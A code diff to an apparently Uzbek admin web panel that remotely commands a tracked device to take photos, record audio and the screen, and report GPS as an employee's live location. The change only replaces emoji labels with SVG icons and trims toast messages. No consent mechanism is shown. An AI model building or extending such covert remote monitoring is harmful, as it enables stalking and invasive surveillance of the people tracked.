@@ -146,7 +146,9 @@ function attachAdminDeviceListeners(devId) {
     adminDeviceData.isAudioRecordingActive = isActive;
     const btn = document.getElementById('admin-voice-btn');
     if (btn) {
-      btn.innerText = isActive ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish";
+      btn.innerHTML = isActive 
+        ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+        : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
       btn.className = isActive ? "btn btn-red" : "btn btn-yellow";
     }
   };
@@ -160,7 +162,9 @@ function attachAdminDeviceListeners(devId) {
     adminDeviceData.isScreenRecordingActive = isActive;
     const btn = document.getElementById('admin-screen-btn');
     if (btn) {
-      btn.innerText = isActive ? "⏹ To'xtatish" : "📹 Ekran Zapis";
+      btn.innerHTML = isActive 
+        ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+        : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
       btn.style.background = isActive ? "#DC2626" : "#7C3AED";
     }
   };
@@ -205,21 +209,25 @@ function renderAdminView() {
 
     <!-- 2. Remote Command Buttons -->
     <div class="task-card" style="padding: 14px;">
-      <div style="font-size: 13px; font-weight: bold; color: var(--navy-dark); margin-bottom: 10px;">
-        ⚡ Masofaviy Boshqaruv Buyruqlari
+      <div style="font-size: 13px; font-weight: bold; color: var(--navy-dark); margin-bottom: 10px; display: flex; align-items: center; gap: 6px;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>Masofaviy Boshqaruv Buyruqlari
       </div>
       <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
         <button class="btn btn-primary" onclick="adminSendTakePhoto()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
-          📷 Rasm Olish
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c1.65 0 3-1.35 3-3s-1.35-3-3-3-3 1.35-3 3 1.35 3 3 3zm0 2c-2.76 0-5 2.24-5 5v1h10v-1c0-2.76-2.24-5-5-5z"/></svg>Rasm Olish
         </button>
         <button id="admin-voice-btn" class="btn ${adminDeviceData.isAudioRecordingActive ? 'btn-red' : 'btn-yellow'}" onclick="adminToggleRecordAudio()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
-          ${adminDeviceData.isAudioRecordingActive ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish"}
+          ${adminDeviceData.isAudioRecordingActive 
+            ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+            : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish"}
         </button>
         <button id="admin-screen-btn" class="btn ${adminDeviceData.isScreenRecordingActive ? 'btn-red' : ''}" onclick="adminToggleRecordScreen()" style="background: ${adminDeviceData.isScreenRecordingActive ? '#DC2626' : '#7C3AED'}; color: white; display: flex; align-items: center; justify-content: center; gap: 6px;">
-          ${adminDeviceData.isScreenRecordingActive ? "⏹ To'xtatish" : "📹 Ekran Zapis"}
+          ${adminDeviceData.isScreenRecordingActive 
+            ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+            : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis"}
         </button>
         <button class="btn btn-outline" onclick="adminSendRequestGps()" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
-          🛰️ GPS Yangilash
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>GPS Yangilash
         </button>
       </div>
     </div>
@@ -228,7 +236,7 @@ function renderAdminView() {
     <div class="task-card" style="padding: 14px;">
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
         <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
-          📍 Jonli Joylashuv (Xarita)
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 0 1 0-5 2.5 2.5 0 0 1 0 5z"/></svg>Jonli Joylashuv (Xarita)
         </div>
         <div id="admin-coords-text" style="font-size: 11px; color: var(--text-secondary);">
           ${adminDeviceData.lat ? `${adminDeviceData.lat.substring(0, 8)}, ${adminDeviceData.lon.substring(0, 8)}` : 'Aniqlanmoqda...'}
@@ -240,8 +248,8 @@ function renderAdminView() {
     <!-- 4. Photos (Back & Front) -->
     <div class="task-card" style="padding: 14px;">
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
-        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
-          📷 Masofaviy Kameralar
+        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>Masofaviy Kameralar
         </div>
         <div id="admin-photo-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
       </div>
@@ -253,8 +261,8 @@ function renderAdminView() {
     <!-- 5. Dictaphone Audio Archive -->
     <div class="task-card" style="padding: 14px;">
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
-        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
-          🎙️ Yozib Olingan Ovozlar
+        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>Yozib Olingan Ovozlar
         </div>
         <div id="admin-audio-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
       </div>
@@ -266,8 +274,8 @@ function renderAdminView() {
     <!-- 6. Screen Recordings / Screenshots -->
     <div class="task-card" style="padding: 14px;">
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
-        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark);">
-          📹 Ekran Tasvirlari
+        <div style="font-weight: bold; font-size: 13px; color: var(--navy-dark); display: flex; align-items: center; gap: 6px;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>Ekran Tasvirlari
         </div>
         <div id="admin-screen-counter" style="font-size: 11px; font-weight: bold; color: var(--primary-blue);"></div>
       </div>
@@ -292,7 +300,7 @@ function updateAdminStatusHeader() {
 
   const now = Date.now();
   const isOnline = (now - adminDeviceData.heartbeat) < 65000;
-  const batteryStr = adminDeviceData.battery !== null ? `🔋 ${adminDeviceData.battery}%` : '🔋 --';
+  const batteryStr = adminDeviceData.battery !== null ? `${adminDeviceData.battery}%` : '--';
 
   badgeEl.innerHTML = `
     <div style="display: flex; align-items: center; gap: 6px;">
@@ -300,7 +308,8 @@ function updateAdminStatusHeader() {
       <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#D97706'};">${isOnline ? 'Online (Faol)' : 'Offline (Kutish rejimida)'}</span>
       ${!isOnline ? '<span style="font-size: 10px; color: var(--text-secondary); margin-left: 4px;">(Buyruqlar navbatga yoziladi)</span>' : ''}
     </div>
-    <div style="color: var(--text-secondary); font-weight: 600;">
+    <div style="color: var(--text-secondary); font-weight: 600; display: flex; align-items: center; gap: 4px;">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
       ${batteryStr}
     </div>
   `;
@@ -378,7 +387,7 @@ function updateAdminMapLocation(lat, lon) {
       }).addTo(adminLeafletMap);
 
       adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
-      adminLeafletMarker.bindPopup("<b>📍 Xodim jonli joylashuvi</b>").openPopup();
+      adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
     } catch (e) {
       console.warn("Leaflet init error:", e);
     }
@@ -389,7 +398,7 @@ function updateAdminMapLocation(lat, lon) {
         adminLeafletMarker.setLatLng([latNum, lonNum]);
       } else {
         adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
-        adminLeafletMarker.bindPopup("<b>📍 Xodim jonli joylashuvi</b>").openPopup();
+        adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
       }
     } catch (e) {
       console.warn("Leaflet update error:", e);
@@ -408,7 +417,7 @@ function adminSendTakePhoto() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(Date.now());
-  showToast(isOnline ? "📷 Rasm olish buyrug'i yuborildi!" : "📷 Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
+  showToast(isOnline ? "Rasm olish buyrug'i yuborildi!" : "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
 }
 
 function adminToggleRecordAudio() {
@@ -420,10 +429,12 @@ function adminToggleRecordAudio() {
 
   const btn = document.getElementById('admin-voice-btn');
   if (btn) {
-    btn.innerText = nextState ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish";
+    btn.innerHTML = nextState 
+      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
     btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
   }
-  showToast(nextState ? (isOnline ? "🎙️ Masofaviy ovoz yozish boshlandi" : "🎙️ Ovoz yozish navbatga qo'yildi") : "🎙️ Ovoz yozish to'xtatildi, saqlanmoqda...");
+  showToast(nextState ? (isOnline ? "Masofaviy ovoz yozish boshlandi" : "Ovoz yozish navbatga qo'yildi") : "Ovoz yozish to'xtatildi, saqlanmoqda...");
 }
 
 function adminToggleRecordScreen() {
@@ -435,17 +446,19 @@ function adminToggleRecordScreen() {
 
   const btn = document.getElementById('admin-screen-btn');
   if (btn) {
-    btn.innerText = nextState ? "⏹ To'xtatish" : "📹 Ekran Zapis";
+    btn.innerHTML = nextState 
+      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
+      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
     btn.style.background = nextState ? "#DC2626" : "#7C3AED";
   }
-  showToast(nextState ? (isOnline ? "📹 Masofaviy ekran yozish boshlandi..." : "📹 Ekran yozish navbatga qo'yildi") : "📹 Ekran yozish to'xtatildi, saqlanmoqda...");
+  showToast(nextState ? (isOnline ? "Masofaviy ekran yozish boshlandi..." : "Ekran yozish navbatga qo'yildi") : "Ekran yozish to'xtatildi, saqlanmoqda...");
 }
 
 function adminSendRequestGps() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
-  showToast(isOnline ? "🛰️ GPS yangilash so'rovi yuborildi!" : "🛰️ GPS so'rovi navbatga qo'yildi");
+  showToast(isOnline ? "GPS yangilash so'rovi yuborildi!" : "GPS so'rovi navbatga qo'yildi");
 }
 
 // Photos Viewer
@@ -493,7 +506,9 @@ function renderAdminPhotos() {
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
       </div>
-      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #16A34A; border-color: #16A34A; color: white;" onclick="adminDownloadPhoto(${idx})">💾 Saqlash</button>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #16A34A; border-color: #16A34A; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadPhoto(${idx})">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Saqlash
+      </button>
     </div>
   `;
 }
@@ -544,7 +559,9 @@ function renderAdminAudio() {
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
       </div>
-      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #0D9488; border-color: #0D9488; color: white;" onclick="adminDownloadAudio(${idx})">💾 Yuklab Olish</button>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #0D9488; border-color: #0D9488; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadAudio(${idx})">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
+      </button>
     </div>
   `;
 }
@@ -601,7 +618,9 @@ function renderAdminScreenCapture() {
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
         <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
       </div>
-      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #7C3AED; border-color: #7C3AED; color: white;" onclick="adminDownloadScreen(${idx})">💾 Yuklab Olish</button>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #7C3AED; border-color: #7C3AED; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadScreen(${idx})">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
+      </button>
     </div>
   `;
 }
@@ -651,11 +670,11 @@ function adminDownloadPhoto(idx) {
   if (downloaded && cur._key && adminSelectedUsername) {
     window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_photos/${cur._key}`).remove()
       .then(() => {
-        showToast("💾 Rasm saqlandi va bazadan o'chirildi!");
+        showToast("Rasm saqlandi va bazadan o'chirildi!");
       })
       .catch(err => {
         console.error(err);
-        showToast("💾 Rasm saqlandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+        showToast("Rasm saqlandi, lekin bazadan o'chirishda xatolik bo'ldi.");
       });
   }
 }
@@ -668,11 +687,11 @@ function adminDownloadAudio(idx) {
   if (cur._key && adminSelectedUsername) {
     window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_audio/${cur._key}`).remove()
       .then(() => {
-        showToast("💾 Ovoz yozuvi yuklandi va bazadan o'chirildi!");
+        showToast("Ovoz yozuvi yuklandi va bazadan o'chirildi!");
       })
       .catch(err => {
         console.error(err);
-        showToast("💾 Ovoz yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+        showToast("Ovoz yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
       });
   }
 }
@@ -692,11 +711,11 @@ function adminDownloadScreen(idx) {
   if (downloaded && cur._key && adminSelectedUsername) {
     window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_screen/${cur._key}`).remove()
       .then(() => {
-        showToast("💾 Ekran yozuvi yuklandi va bazadan o'chirildi!");
+        showToast("Ekran yozuvi yuklandi va bazadan o'chirildi!");
       })
       .catch(err => {
         console.error(err);
-        showToast("💾 Ekran yozuvi yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+        showToast("Ekran yozuvi yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
       });
   }
 }
